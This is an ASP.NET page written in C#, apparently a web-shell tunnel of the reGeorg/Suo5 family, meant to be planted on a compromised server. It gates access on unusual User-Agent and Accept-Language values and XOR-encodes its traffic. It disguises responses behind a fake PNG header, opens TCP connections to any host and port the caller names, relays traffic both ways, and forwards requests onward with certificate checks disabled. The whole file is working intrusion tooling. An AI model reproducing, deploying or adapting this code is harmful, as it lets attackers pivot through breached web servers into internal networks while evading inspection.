<%@ Page Language="C#" %>

<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Net.NetworkInformation" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.Collections.Generic" %>
<script runat="server">
    static Hashtable addrs = CollectAddr();
    static Hashtable ctx = Hashtable.Synchronized(new Hashtable());

    private bool checkAuth()
    {
        string ua = Request.Headers.Get("User-Agent");
        if (ua == null || (!ua.Contains("  ") && !ua.Contains("0.1.0")))
        {
            return false;
        }
        String acceptLang = Request.Headers.Get("Accept-Language");
        if (acceptLang.EndsWith("0.6"))
        {
            Random random = new Random();

            byte[] buffer = new byte[random.Next(512)];
            random.NextBytes(buffer);
            Response.BinaryWrite(buffer);

            byte[] readData = Request.BinaryRead(64);
            Response.BinaryWrite(readData);
            Response.Flush();
            return false;
        }
        return true;
    }
    protected void processUnary()
    {
        Response.ContentType = "application/octet-stream";
        byte[] body = Request.BinaryRead(Request.ContentLength);
        Dictionary<string, byte[]> dataMap = Unmarshal(body);
        string clientId = Encoding.ASCII.GetString(dataMap["id"]);
        byte[] actions = dataMap["ac"];
        if (actions.Length != 1) return;
        byte action = actions[0];

        byte[] redirectData = null;
        bool needRedirect = dataMap.TryGetValue("r", out redirectData) && redirectData != null && redirectData.Length > 0;
        string redirectUrl = "";
        if (needRedirect)
        {
            dataMap.Remove("r");
            redirectUrl = Encoding.ASCII.GetString(redirectData);
            Uri u = new Uri(redirectUrl);
            needRedirect = !addrs.ContainsKey(u.Host);
        }

        // load balance, send request with data to request url
        // action 0x00 need to pipe stream, see below
        if (needRedirect && action >= 0x01 && action <= 0x03)
        {
            HttpWebResponse resp = Redirect(Request, dataMap, redirectUrl);
            resp.Close();
            return;
        }

        /*
            ActionCreate    byte = 0x00
            ActionData      byte = 0x01
            ActionDelete    byte = 0x02
            ActionHeartbeat byte = 0x03
        */
        Stream respOutStream = Response.OutputStream;
        if (action == 0x02)
        {
            if (!ctx.ContainsKey(clientId)) return;
            TcpClient s = (TcpClient)ctx[clientId];
            ctx.Remove(clientId);
            if (s == null) return;
            s.Close();
            return;
        }
        else if (action == 0x01)
        {
            // todo: remove unneeded package
            if (!ctx.ContainsKey(clientId))
            {
                byte[] data = Marshal(newDel());
                respOutStream.Write(data, 0, data.Length);
                return;
            };
            TcpClient s = (TcpClient)ctx[clientId];
            byte[] scData = dataMap["dt"];
            if (scData.Length != 0)
            {
                s.GetStream().Write(scData, 0, scData.Length);
            }
            return;
        }
        else { }

        if (action != 0x00) return;
        Response.AddHeader("X-Accel-Buffering", "no");
        respOutStream.Write(new byte[] {
    (byte)0x89, (byte)0x50, (byte)0x4E, (byte)0x47, (byte)0x0D, (byte)0x0A, (byte)0x1A, (byte)0x0A, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x0D, (byte)0x49, (byte)0x48, (byte)0x44, (byte)0x52,
    (byte)0x00, (byte)0x00, (byte)0x03, (byte)0x20, (byte)0x00, (byte)0x00, (byte)0x02, (byte)0x58, (byte)0x08, (byte)0x06, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x9A, (byte)0x76, (byte)0x82,
    (byte)0x70, (byte)0x00, (byte)0x03, (byte)0x76, (byte)0x3C, (byte)0x49, (byte)0x44, (byte)0x41, (byte)0x54, (byte)0x78, (byte)0x01, (byte)0xEC, (byte)0xC6, (byte)0x05, (byte)0xA1, (byte)0x86,
    (byte)0x00, (byte)0x18, (byte)0x03, (byte)0x40, (byte)0xDC, (byte)0x4A, (byte)0xD3, (byte)0x87, (byte)0x12, (byte)0x14, (byte)0xA0, (byte)0xD3, (byte)0xD0, (byte)0x02, (byte)0xCF, (byte)0xE5,
    (byte)0xBF, (byte)0xFB, (byte)0x64, (byte)0x2B, (byte)0xDE, (byte)0x01, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00,
    (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00,
    (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00,
    (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00,
    (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x20, (byte)0xE5, (byte)0x79, (byte)0x49, (byte)0xAA, (byte)0xE7, (byte)0xEA, (byte)0x79, (byte)0x4E,
    (byte)0xB7, (byte)0x2C, (byte)0x19, (byte)0x8E, (byte)0x6C, (byte)0x8F, (byte)0x1C, (byte)0x9F, (byte)0x3E, (byte)0x1D, (byte)0x39, (byte)0x26, (byte)0xA9, (byte)0x8F, (byte)0xEC, (byte)0x8F,
    (byte)0xEB, (byte)0xB6, (byte)0x2D, (byte)0xD3, (byte)0xBA, (byte)0xA6, (byte)0x2F, (byte)0x1E, (byte)0x49, (byte)0xDA, (byte)0x24, (byte)0x75, (byte)0x01, (byte)0x00, (byte)0xF0, (byte)0xCD,
    (byte)0xCA, (byte)0x02, (byte)0xF8, (byte)0x55, (byte)0x76, (byte)0x76, (byte)0xCE, (byte)0x22, (byte)0x58, (byte)0x92, (byte)0x63, (byte)0x4B, (byte)0xD3, (byte)0xFF, (byte)0x39, (byte)0xEE,
    (byte)0x1E, (byte)0x98, (byte)0x70, (byte)0x51, (byte)0x25, (byte)0x1A, (byte)0x66, (byte)0x3D, (byte)0xEB, (byte)0x55, (byte)0x33, (byte)0x33, (byte)0xAE, (byte)0x86, (byte)0xAA, (byte)0x87,
    (byte)0x79, (byte)0x9A, (byte)0x99, (byte)0xB9, (byte)0xA5, (byte)0x3B, (byte)0xCC, (byte)0x4C, (byte)0xCD, (byte)0xFB, (byte)0xA7, (byte)0x7D, (byte)0x6F, (byte)0xC7, (byte)0x64, (byte)0xBD,
    (byte)0x1A, (byte)0x66, (byte)0xC6, (byte)0x26, (byte)0x3D, (byte)0x93, (byte)0xF4, (byte)0xBA, (byte)0xAA, (byte)0x2E, (byte)0x66, (byte)0x84, (byte)0xC3, (byte)0x39, (byte)0xE3, (byte)0x9E,
    (byte)0x91, (byte)0x69, (byte)0xA5, (byte)0x61, (byte)0x6E, (byte)0xF4, (byte)0xAF, (byte)0xEC, (byte)0xB3, (byte)0xFF, (byte)0xC4, (byte)0x89, (byte)0xC8, (byte)0xA2, (byte)0x55, (byte)0xFD,
    (byte)0xE5, (byte)0x99, (byte)0x59, (byte)0x4A, (byte)0x44, (byte)0x0E, (byte)0x7A, (byte)0xFA, (byte)0x14, (byte)0x26, (byte)0x67, (byte)0x6B, (byte)0x8C, (byte)0x77, (byte)0xC6, (byte)0x90,
    (byte)0x8D, (byte)0x11, (byte)0x2C, (byte)0x02, (byte)0xC3, (byte)0x4C, (byte)0x06, (byte)0x99, (byte)0x32, (byte)0x67, (byte)0x19, (byte)0x19, (byte)0x63, (byte)0x40, (byte)0x40, (byte)0xA2,
    (byte)0x10, (byte)0x72, (byte)0x2E, (byte)0x68, (byte)0xDB, (byte)0x82, (byte)0x37, (byte)0x1B, (byte)0xF0, (byte)0x7A, (byte)0x0D, (byte)0x37, (byte)0x8E, (byte)0xE0, (byte)0x7C, (byte)0x8D,
    (byte)0x2C, (byte)0x11, (byte)0x01, (byte)0x4D, (byte)0x03, (byte)0x88, (byte)0x40, (byte)0x98, (byte)0x4D, (byte)0x20, (byte)0x52, (byte)0xBF, (byte)0xDB, (byte)0x61, (byte)0xCE, (byte)0x19,
    (byte)0x55, (byte)0x75, (byte)0x7E, (byte)0xF7, (byte)0x5D, (byte)0x84, (byte)0xB7, (byte)0xDF, (byte)0xD6, (byte)0xF4, (byte)0x1F, (byte)0xFF, (byte)0x63, (byte)0xE7, (byte)0x3F, (byte)0xF0,
    (byte)0x01, (byte)0xA4, (byte)0x7F, (byte)0xF6, (byte)0xCF, (byte)0x20, (byte)0x57, (byte)0x57, (byte)0x88, (byte)0x00, (byte)0x29, (byte)0x7E, (byte)0x6E, (byte)0x52, (byte)0xA9, (byte)0x54,
    (byte)0x2A, (byte)0x95, (byte)0x4A, (byte)0xA5, (byte)0x16, (byte)0x90, (byte)0x4A, (byte)0xA5, (byte)0x52, (byte)0x4E, (byte)0x2F, (byte)0xAE, (byte)0xAE, (byte)0xC8, (byte)0x7F, (byte)0xCF,
    (byte)0xF7, (byte)0xE8, (byte)0x85, (byte)0x31, (byte)0xDE, (byte)0xA6, (byte)0x44, (byte)0xC6, (byte)0x5A, (byte)0xB4, (byte)0x31, (byte)0x92, (byte)0x8B, (byte)0x31, (byte)0xB9, (byte)0x94,
    (byte)0x60, (byte)0x55, (byte)0x61, (byte)0x54, (byte)0x89, (byte)0x73, (byte)0x16, (byte)0x6D, (byte)0x4A, (byte)0x4B, (byte)0xD1, (byte)0x28, (byte)0x3B, (byte)0x2C, (byte)0xF0, (byte)0xB2,
    (byte)0x5B, (byte)0x60, (byte)0x5E, (byte)0x66, (byte)0xE7, (byte)0xC0, (byte)0xC3, (byte)0x00, (byte)0xB3, (byte)0xDD, (byte)0xA2, (byte)0x71, (byte)0x8E, (byte)0x6C, (byte)0xDF, (byte)0x83,
    (byte)0xF2, (byte)0xCE, (byte)0x3A, (byte)0x27, (byte)0x6C, (byte)0xED, (byte)0xF1, (byte)0x59, (byte)0x15, (byte)0x55, (byte)0x84, (byte)0x94, (byte)0x10, (byte)0xBD, (byte)0x67, (byte)0x3F,
    (byte)0xCF, (byte)0x1A, (byte)0x42, (byte)0x80, (byte)0xBF, (byte)0xB9, (byte)0x51, (byte)0x3F, (byte)0x4D, (byte)0xF0, (byte)0x21, (byte)0x98, (byte)0x48, (byte)0xA4, (byte)0xC2, (byte)0x0C,
    (byte)0x51, (byte)0x55, (byte)0x0F, (byte)0x58, (byte)0x38, (byte)0x87, (byte)0x20, (byte)0xA2, (byte)0x11, (byte)0xD0, (byte)0xB9, (byte)0x69, (byte)0x54, (byte)0xC6, (byte)0xB1, (byte)0x9B,
    (byte)0x1E, (byte)0x3F, (byte)0x86, (byte)0x27, (byte)0x82, (byte)0xFC, (byte)0xAC, (byte)0x29, (byte)0x28, (byte)0x95, (byte)0x4A, (byte)0xA5, (byte)0x52, (byte)0xA9, (byte)0x54, (byte)0x6A,
    (byte)0x01, (byte)0xA9, (byte)0x54, (byte)0x2A, (byte)0xCA, (byte)0x1F, (byte)0xFC, (byte)0x20, (byte)0x9A, (byte)0x0F, (byte)0x7D, (byte)0x68, (byte)0x6A, (byte)0xC7, (byte)0x91, (byte)0x07,
    (byte)0xEF, (byte)0xC9, (byte)0x3A, (byte)0x47, (byte)0x9D, (byte)0x2A, (byte)0xDC, (byte)0x34, (byte)0xA5, (byte)0x46, (byte)0x04, (byte)0x56, (byte)0xB5, (byte)0x14, (byte)0x0F, (byte)0x18,
    (byte)0x55, (byte)0x71, (byte)0x29, (byte)0x95, (byte)0x04, (byte)0x2F, (byte)0x05, (byte)0x83, (byte)0x8C, (byte)0x48, (byte)0x62, (byte)0x80, (byte)0x58, (byte)0x04, (byte)0x60, (byte)0x46,
    (byte)0x49, (byte)0x2A, (byte)0x32, (byte)0xEF, (byte)0x73, (byte)0x4F, (byte)0x4E, (byte)0x66, (byte)0x06, (byte)0x9A, (byte)0x06, (byte)0x66, (byte)0x1C, (byte)0xC5, (byte)0xAE, (byte)0x56,
    (byte)0xD4, (byte)0xE4, (byte)0xD9, (byte)0xB6, (byte)0x2D, (byte)0x6C, (byte)0xD9, (byte)0x59, (byte)0x0B, (byte)0xCE, (byte)0x12, (byte)0xB3, (byte)0x02, (byte)0x28, (byte)0x22, (byte)0xA6,
    (byte)0x84, (byte)0x18, (byte)0x23, (byte)0x62, (byte)0x08, (byte)0xE4, (byte)0xBD, (byte)0xC7, (byte)0x3C, (byte)0x4D, (byte)0x1A, (byte)0x76, (byte)0x3B, (byte)0xF8, (byte)0xDD, (byte)0x4E,
    (byte)0x7D, (byte)0x8C, (byte)0x1C, (byte)0x01, (byte)0x48, (byte)0x91, (byte)0xA8, (byte)0x24, (byte)0x8B, (byte)0x31, (byte)0x50, (byte)0x6B, (byte)0x91, (byte)0x88, (byte)0x34, (byte)0xB5,
    (byte)0x2D, (byte)0x82, (byte)0x08, (byte)0x47, (byte)0x55, (byte)0x78, (byte)0x55, (byte)0xF1, (byte)0x4D, (byte)0x63, (byte)0xEE, (byte)0xA6, (byte)0x49, (byte)0xC2, (byte)0x93, (byte)0x27,
    (byte)0xBD, (byte)0xCF, (byte)0xC5, (byte)0x6A, (byte)0x42, (byte)0xA5, (byte)0x52, (byte)0xA9, (byte)0x54, (byte)0x2A, (byte)0x95, (byte)0x4A, (byte)0x2D, (byte)0x20, (byte)0x95, (byte)0xCA,
    (byte)0x4F, (byte)0x27, (byte)0x4F, (byte)0x9B, (byte)0x8F, (byte)0xFC, (byte)0x48, (byte)0xEA, (byte)0x3E, (byte)0xF2, (byte)0x23, (byte)0x4D, (byte)0x77, (byte)0x7A, (byte)0xCA, (byte)0xCD,
    (byte)0xC5, (byte)0x85, (byte)0xF4, (byte)0x44, (byte)0xDC, (byte)0x89, (byte)0xA0, (byte)0x61, (byte)0xB6, (byte)0x8E, (byte)0x48, (byte)0x9A, (byte)0x18, (byte)0xB1, (byte)0x2F, (byte)0x1B,
    (byte)0x00, (byte)0x6C, (byte)0x4A, (byte)0x6A, (byte)0x45, (byte)0xC0, (byte)0x59, (byte)0x73, (byte)0x90, (byte)0x55, (byte)0x25, (byte)0x27, (byte)0x31, (byte)0x50, (byte)0xE6, (byte)0x45,
    (byte)0x11, (byte)0x10 }, 0, 674);

        string host = Encoding.ASCII.GetString(dataMap["h"]);
        IPAddress ip;
        try
        {
            ip = IPAddress.Parse(host);
        }
        catch (Exception)
        {
            IPHostEntry hostInfo = Dns.GetHostEntry(host);
            if (hostInfo.AddressList.Length == 0)
            {
                byte[] data = Marshal(newStatus(0x01));
                respOutStream.Write(data, 0, data.Length);
                return;
            }
            ip = hostInfo.AddressList[0];
        }
        string portStr = Encoding.ASCII.GetString(dataMap["p"]).Trim();
        if (portStr == "0")
        {
            portStr = Request.ServerVariables["SERVER_PORT"];
            if (portStr == "")
            {
                portStr = "80";
            }
        }
        int port = Int32.Parse(portStr);

        TcpClient client = null;
        Stream readFrom = null;
        if (needRedirect)
        {
            HttpWebResponse resp = Redirect(Request, dataMap, redirectUrl);
            readFrom = resp.GetResponseStream();
        }
        else
        {

            try
            {
                client = new TcpClient();
                bool isOk = client.BeginConnect(ip, port, null, null).AsyncWaitHandle.WaitOne(3000, true);
                if (isOk)
                {
                    ctx.Add(clientId, client);
                    readFrom = client.GetStream();
                    byte[] data = Marshal(newStatus(0x00));
                    respOutStream.Write(data, 0, data.Length);
                    respOutStream.Flush();
                    Response.Flush();
                }
                else
                {
                    throw new IOException("");
                }
            }
            catch (Exception)
            {
                if (client != null)
                {
                    client.Close();
                }
                ctx.Remove(clientId);
                byte[] data = Marshal(newStatus(0x01));
                respOutStream.Write(data, 0, data.Length);
                return;
            }
        }

        byte[] readBuf = new byte[1024 * 8];
        try
        {
            while (true)
            {
                int readLen = readFrom.Read(readBuf, 0, readBuf.Length);
                if (readLen == 0) break;
                byte[] realBuf = new byte[readLen];
                Array.Copy(readBuf, realBuf, readLen);
                if (!needRedirect)
                {
                    realBuf = Marshal(newData(realBuf));
                }
                respOutStream.Write(realBuf, 0, realBuf.Length);
                respOutStream.Flush();
                Response.Flush();
            }
        }
        catch (Exception)
        {
        }
        finally
        {
            if (readFrom != null) readFrom.Close();
            if (client != null) client.Close();
            ctx.Remove(clientId);
        }
    }

    private static byte[] Marshal(Dictionary<String, byte[]> m)
    {
        MemoryStream buf = new MemoryStream();
        BinaryWriter bw = new BinaryWriter(buf);
        foreach (KeyValuePair<string, byte[]> kvp in m)
        {
            string key = kvp.Key;
            byte[] value = kvp.Value;
            bw.Write((Byte)key.Length);
            bw.Write((Encoding.ASCII.GetBytes(key)));
            byte[] vLen = BitConverter.GetBytes((Int32)value.Length);
            Array.Reverse(vLen);
            bw.Write(vLen);
            bw.Write(value);
        }
        bw.Close();
        byte[] data = buf.ToArray();
        byte[] randKeys = new byte[1];
        new Random().NextBytes(randKeys);
        byte xorKey = randKeys[0];

        buf = new MemoryStream();
        bw = new BinaryWriter(buf);
        byte[] lenData = BitConverter.GetBytes((Int32)data.Length);
        Array.Reverse(lenData);
        bw.Write(lenData);
        bw.Write(xorKey);

        for (int i = 0; i < data.Length; i++)
        {
            data[i] = (byte)(data[i] ^ xorKey);
        }
        bw.Write(data);
        bw.Close();
        return buf.ToArray();
    }

    private static Dictionary<string, byte[]> Unmarshal(byte[] body)
    {
        BinaryReader br = new BinaryReader(new MemoryStream(body));
        // bigendian
        byte[] lenData = br.ReadBytes(4);
        Array.Reverse(lenData);
        int len = BitConverter.ToInt32(lenData, 0);

        byte xor = br.ReadByte();
        if (len > 1024 * 1024 * 32)
        {
            throw new IOException("invalid len");
        }
        byte[] data = br.ReadBytes(len);
        if (data.Length != len)
        {
            throw new IOException("invalid data");
        }
        for (int i = 0; i < data.Length; i++)
        {
            data[i] = (byte)(data[i] ^ xor);
        }
        br.Close();
        br = new BinaryReader(new MemoryStream(data));
        Dictionary<String, byte[]> m = new Dictionary<string, byte[]>();
        for (int i = 0; i < data.Length - 1;)
        {
            int kLen = (int)br.ReadByte();
            i += 1;
            if (kLen < 0 || i + kLen >= data.Length)
            {
                break;
            }
            string key = Encoding.ASCII.GetString(br.ReadBytes(kLen));
            i += kLen;

            if (i + 4 >= data.Length)
            {
                break;
            }
            byte[] vlenData = br.ReadBytes(4);
            i += 4;
            Array.Reverse(vlenData);
            int vLen = BitConverter.ToInt32(vlenData, 0);
            if (vLen < 0 || i + vLen > data.Length)
            {
                break;
            }
            byte[] value = br.ReadBytes(vLen);
            i += vLen;
            m.Add(key, value);
        }
        br.Close();
        return m;
    }

    private static Dictionary<string, byte[]> newDel()
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m.Add("ac", new byte[] { 0x02 });
        return m;
    }

    private static Dictionary<string, byte[]> newStatus(byte b)
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m.Add("s", new byte[] { b });
        return m;
    }

    private static Dictionary<string, byte[]> newData(byte[] data)
    {
        Dictionary<string, byte[]> m = new Dictionary<string, byte[]>();
        m.Add("ac", new byte[] { 0x01 });
        m.Add("dt", data);
        return m;
    }

    private static Hashtable CollectAddr()
    {
        Hashtable addrs = new Hashtable();

        try
        {
            NetworkInterface[] nifs = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface nif in nifs)
            {
                IPInterfaceProperties ipProps = nif.GetIPProperties();
                foreach (IPAddressInformation addrInfo in ipProps.UnicastAddresses)
                {
                    string s = addrInfo.Address.ToString();
                    if (s != null)
                    {
                        int idx = s.IndexOf('%');
                        if (idx > 0)
                        {
                            s = s.Substring(0, idx);
                        }
                        addrs[s] = true;
                    }
                }
            }
        }
        catch (Exception)
        {
        }

        return Hashtable.Synchronized(addrs);
    }

    private static HttpWebResponse Redirect(HttpRequest request, Dictionary<string, byte[]> dataMap, string rUrl)
    {
        string method = request.HttpMethod;
        HttpWebRequest conn = (HttpWebRequest)WebRequest.Create(rUrl);
        conn.Method = method;
        conn.Timeout = 3000;
        conn.ReadWriteTimeout = System.Threading.Timeout.Infinite;
        conn.AllowAutoRedirect = true;

        // Ignore SSL verify
        ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

        DateTime date;
        foreach (string key in request.Headers.AllKeys)
        {
            string value = request.Headers[key];
            // avoid System.ArgumentException
            switch (key)
            {
                case "Accept":
                    conn.Accept = value;
                    break;
                case "Connection":
                    conn.Connection = value;
                    break;
                case "Content-Type":
                    conn.ContentType = value;
                    break;
                case "Content-Length":
                    break;
                // .net 2.0 doesn't has this attr
                //case "Date":
                //if (DateTime.TryParse(value, out date)) conn.Date = date;
                //break;
                case "Expect":
                    conn.Expect = value;
                    break;
                case "If-Modified-Since":
                    if (DateTime.TryParse(value, out date)) conn.IfModifiedSince = date;
                    break;
                case "Referer":
                    conn.Referer = value;
                    break;
                case "User-Agent":
                    conn.UserAgent = value;
                    break;
                default:
                    if (WebHeaderCollection.IsRestricted(key, false))
                    {
                        continue;
                    }
                    conn.Headers.Add(key, request.Headers[key]);
                    break;
            }
        }
        Stream rout = conn.GetRequestStream();
        byte[] data = Marshal(dataMap);
        rout.Write(data, 0, data.Length);
        rout.Close();

        HttpWebResponse response = (HttpWebResponse)conn.GetResponse();
        return response;
    }</script>
<%
    if (!ctx.ContainsKey("alter_pool"))
    {
        ctx.Add("alter_pool", new TcpClient());
        const int workers = 256;
        int workerThreads, completionPortThreads;
        System.Threading.ThreadPool.GetMaxThreads(out workerThreads, out completionPortThreads);
        if (workerThreads < workers) workerThreads += workers;
        if (completionPortThreads < workers) completionPortThreads += workers;
        System.Threading.ThreadPool.SetMaxThreads(workerThreads, completionPortThreads);

        System.Threading.ThreadPool.GetMinThreads(out workerThreads, out completionPortThreads);
        if (workerThreads < workers) workerThreads = workers;
        if (completionPortThreads < workers) completionPortThreads = workers;
        System.Threading.ThreadPool.SetMinThreads(workerThreads, completionPortThreads);
    }

    Context.Server.ScriptTimeout = Int32.MaxValue;
    bool pass = checkAuth();
    if (!pass)
    {
        return;
    }
    try
    {
        processUnary();
    }
    catch (Exception ex)
    {
    }
%>